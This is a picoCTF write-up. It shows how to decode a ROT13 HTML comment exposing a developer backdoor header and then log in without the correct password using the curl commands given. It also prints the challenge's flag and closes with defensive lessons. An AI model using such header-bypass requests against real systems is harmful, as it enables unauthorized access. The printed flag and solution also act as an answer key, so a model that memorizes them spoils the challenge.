picoCTF Writeup — Hidden Developer Bypass

Author: Yahaya Meddy

⸻

Challenge Description

We are investigating a person of interest named ctf-player who is suspected of hiding sensitive data inside a restricted web portal. The known login email is:

ctf-player@picoctf.org

However, the password is unknown and traditional password guessing techniques do not work. The challenge hints that a developer might have left a hidden backdoor in the application.

⸻

Step 1 — Inspect the Webpage Source Code

After launching the challenge instance, open the webpage and inspect the page source.

Inside the HTML source, the following comment is visible:

<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->

The text appears to be encoded.

⸻

Step 2 — Decode the Message

The string ABGR hints at ROT13 encoding.

Using CyberChef with the ROT13 operation, decode the message.

Encoded text:

ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"

Decoded output:

NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"

This reveals that the developer left a temporary authentication bypass that works if a specific HTTP header is supplied.

⸻

Step 3 — Test the Header Bypass

Send a request to the website while including the special header.

Example using curl:

curl -i -H "X-Dev-Access: yes" "http://amiable-citadel.picoctf.net:52121/"

The server responds with HTTP 200 OK, confirming the header is accepted.

The login page is returned along with JavaScript that sends credentials to the /login endpoint.

⸻

Step 4 — Analyze the Login Request

From the page source, the login form sends a POST request to:

/login

with JSON data containing:

email
password

Since the developer bypass exists, authentication might succeed regardless of the password.

⸻

Step 5 — Send the Login Request Manually

Use curl to send a login request while including the developer header.

curl -s -X POST \
  -H "X-Dev-Access: yes" \
  -H "Content-Type: application/json" \
  -d '{"email":"ctf-player@picoctf.org","password":"whatever"}' \
  "http://amiable-citadel.picoctf.net:52121/login"

Server response:

{
 "success": true,
 "email": "ctf-player@picoctf.org",
 "firstName": "pico",
 "lastName": "player",
 "flag": "picoCTF{brut4_f0rc4_7e5db33b}"
}

The authentication succeeds even with an incorrect password because the developer bypass header disables authentication checks.

⸻

Step 6 — Retrieve the Flag

The response contains the flag:

picoCTF{brut4_f0rc4_7e5db33b}


⸻

Vulnerability Explanation

The application contains a hardcoded developer bypass mechanism. If the request includes the header:

X-Dev-Access: yes

the server skips normal authentication checks and grants access.

Additionally, the developer mistakenly left a comment in the production code revealing this bypass. Although it was encoded with ROT13, it was trivial to decode.

This represents a common security misconfiguration, where debugging or development backdoors remain enabled in production.

⸻

Key Lessons
  • Always inspect HTML source code during web exploitation.
  • Encodings like ROT13 are often used to hide hints in CTF challenges.
  • HTTP headers can sometimes be used to bypass authentication logic.
  • Development backdoors should never be left in production environments.

⸻

Final Flag

picoCTF{brut4_f0rc4_7e5db33b}